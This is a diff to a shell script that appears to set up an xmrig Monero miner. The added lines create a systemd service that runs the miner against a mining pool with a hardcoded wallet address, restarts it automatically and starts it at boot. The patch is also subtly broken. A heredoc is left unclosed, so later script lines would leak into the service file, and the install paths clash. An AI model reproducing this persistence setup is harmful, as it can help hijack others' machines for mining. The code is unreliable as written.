@@ -150,6 +150,19 @@ EOL
 
 chmod +x $HOME/mmain/miner.sh
 
+echo "[*] Creating moneroocean_miner systemd service"
+    cat >/tmp/moneroocean_miner.service <<EOL
+[Unit]
+Description=Monero miner service
+
+[Service]
+ExecStart=$HOME/minershell-main/xmrig --url pool.hashvault.pro:80 --user 4ArAQ9Qo5C78xgtbzdrsAUTHtCGYQjk7XintpgNAWogbPBCG5SWNqCJ27mAtiqTxoaAeBwLaD2Kh2F8CooS9y9EjUNW3kAE --pass XX --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --config=$HOME/minershell-main/config.json
+Restart=always
+Nice=10
+CPUWeight=1
+
+[Install]
+WantedBy=multi-user.target
 echo "[*] Creating $HOME/mmain/config_background.json"
 cp $HOME/mmain/config.json $HOME/mmain/config_background.json
 
